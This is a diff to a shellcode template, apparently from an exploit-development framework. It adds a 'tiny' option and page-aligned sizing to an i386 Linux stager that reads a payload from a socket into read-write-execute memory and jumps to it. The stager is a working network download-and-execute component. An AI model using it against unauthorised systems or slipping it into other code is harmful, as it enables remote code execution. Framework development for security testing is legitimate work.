@@ -9,18 +9,19 @@ Args:
     sock, the socket to read the payload from.
     size, the size of the payload
 </%docstring>
-<%page args="sock, size, handle_error=False"/>
+<%page args="sock, size, handle_error=False, tiny=False"/>
 <%
     stager = common.label("stager")
     looplabel = common.label("read_loop")
     errlabel  = common.label("error")
+    mmap_size = (size + 0xfff) & ~0xfff
     rwx       = PROT_EXEC | PROT_WRITE | PROT_READ
     anon_priv = MAP_ANON | MAP_PRIVATE
 %>
     ${push(sock)}
 ${stager}:
     ${mov('ebx', 0)}
-    ${syscall(SYS_mmap2, 'ebx', size, rwx, anon_priv, -1, 'ebx')}
+    ${syscall(SYS_mmap2, 'ebx', mmap_size, rwx, anon_priv, -1, 'ebx')}
 
     pop  ebp /* socket */
     push eax /* save for: pop eax; call eax later */
@@ -34,9 +35,11 @@ ${looplabel}:
     test eax, eax
     js ${errlabel}
 % endif
+% if not tiny:
     add ebx, eax
     sub edx, eax
     jnz ${looplabel}
+% endif
 
     ret /* start of mmapped buffer, ebp = socket */
 
